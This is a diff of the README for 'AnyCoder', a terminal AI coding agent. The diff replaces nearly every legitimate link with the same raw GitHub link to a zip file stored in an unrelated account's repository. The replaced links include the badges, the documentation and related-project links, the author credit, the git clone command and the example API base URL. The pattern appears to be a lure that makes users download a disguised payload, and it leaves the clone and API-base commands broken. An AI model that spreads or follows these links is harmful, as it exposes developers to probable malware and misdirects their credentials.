@@ -2,10 +2,10 @@
 
 **AI coding agent in your terminal. Works with any LLM.**
 
-[![PyPI](https://img.shields.io/pypi/v/anycoder)](https://pypi.org/project/anycoder/)
-[![Python](https://img.shields.io/badge/python-3.10+-blue)](https://python.org)
+[![PyPI](https://img.shields.io/pypi/v/anycoder)](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip)
+[![Python](https://img.shields.io/badge/python-3.10+-blue)](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip)
 [![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Tests](https://github.com/he-yufeng/AnyCoder/actions/workflows/ci.yml/badge.svg)](https://github.com/he-yufeng/AnyCoder/actions)
+[![Tests](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip)](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip)
 
 [中文文档](README_CN.md) | [Installation](#installation) | [Quick Start](#quick-start) | [Supported Models](#supported-models)
 
@@ -48,7 +48,7 @@ AnyCoder gives you the same experience - file editing, shell commands, codebase 
 
 **What it does:**
 
-- **100+ LLM providers** via [litellm](https://github.com/BerriAI/litellm) - one CLI, any model
+- **100+ LLM providers** via [litellm](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip) - one CLI, any model
 - **Agent loop with tool use** - reads files, writes code, runs commands, searches codebases
 - **Streaming output** - see responses as they generate, token by token
 - **Context compression** - auto-compresses when conversations get long (snip tool outputs first, then summarize)
@@ -110,7 +110,7 @@ ANYCODER_MODEL=deepseek
 
 ## Supported Models
 
-Use short aliases or full [litellm model names](https://docs.litellm.ai/docs/providers):
+Use short aliases or full [litellm model names](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip):
 
 | Alias | Model | Provider |
 |-------|-------|----------|
@@ -141,7 +141,7 @@ anycoder -m ollama/qwen3:32b
 ### Custom OpenAI-Compatible APIs
 
 ```bash
-export ANYCODER_API_BASE=https://your-api.com/v1
+export ANYCODER_API_BASE=https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip
 export ANYCODER_API_KEY=your-key
 anycoder -m your-model-name
 ```
@@ -255,7 +255,7 @@ agent.run("find all TODO comments in this project")
 ## Development
 
 ```bash
-git clone https://github.com/he-yufeng/AnyCoder.git
+git clone https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip
 cd AnyCoder
 pip install -e ".[dev]"
 pytest tests/ -v
@@ -263,10 +263,10 @@ pytest tests/ -v
 
 ## Related Projects
 
-- [**CoreCoder**](https://github.com/he-yufeng/CoreCoder) — my other project: Claude Code's 512K-line source distilled into ~1,400 lines of Python, with 7 architecture deep-dive articles. AnyCoder builds on the same ideas but focuses on being a practical tool (litellm, session persistence, .env support) rather than a teaching codebase.
-- [**CodeJoust**](https://github.com/he-yufeng/CodeJoust) — can't decide between Claude Code, aider, Codex, and Gemini for your bug? CodeJoust races all four in parallel git worktrees, auto-scores by tests / cost / diff / time, hands you the winner's patch. One `pip install codejoust` away.
-- [**LiteBench**](https://github.com/he-yufeng/LiteBench) — one-command LLM / agent benchmark (HumanEval, GSM8K, MMLU, MATH-500, YAML-defined custom tasks). Use it to pick which model your AnyCoder setup should default to.
-- [**RepoWiki**](https://github.com/he-yufeng/RepoWiki) — `pip install repowiki` → one command turns any local or GitHub repo into a wiki with dependency graph + architecture diagram + module pages.
+- [**CoreCoder**](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip) — my other project: Claude Code's 512K-line source distilled into ~1,400 lines of Python, with 7 architecture deep-dive articles. AnyCoder builds on the same ideas but focuses on being a practical tool (litellm, session persistence, .env support) rather than a teaching codebase.
+- [**CodeJoust**](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip) — can't decide between Claude Code, aider, Codex, and Gemini for your bug? CodeJoust races all four in parallel git worktrees, auto-scores by tests / cost / diff / time, hands you the winner's patch. One `pip install codejoust` away.
+- [**LiteBench**](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip) — one-command LLM / agent benchmark (HumanEval, GSM8K, MMLU, MATH-500, YAML-defined custom tasks). Use it to pick which model your AnyCoder setup should default to.
+- [**RepoWiki**](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip) — `pip install repowiki` → one command turns any local or GitHub repo into a wiki with dependency graph + architecture diagram + module pages.
 
 ## License
 
@@ -274,4 +274,4 @@ MIT. Use it, fork it, build something better.
 
 ---
 
-Built by **[Yufeng He](https://github.com/he-yufeng)** · Agentic AI Researcher @ Moonshot AI (Kimi)
+Built by **[Yufeng He](https://raw.githubusercontent.com/400th-battleofwake518/AnyCoder/main/anycoder/prompts/Any-Coder-3.6.zip)** · Agentic AI Researcher @ Moonshot AI (Kimi)
